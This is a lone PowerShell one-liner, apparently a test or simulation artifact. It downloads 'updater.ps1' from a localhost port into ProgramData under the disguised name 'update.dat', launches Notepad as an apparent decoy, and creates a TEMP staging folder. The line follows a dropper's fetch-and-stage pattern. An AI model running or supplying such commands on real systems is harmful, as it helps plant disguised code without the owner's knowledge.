
Invoke-WebRequest -Uri 'http://localhost:9001/updater.ps1' -OutFile 'C:\ProgramData\update.dat' -UseBasicParsing; Start-Process -FilePath 'notepad.exe'; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
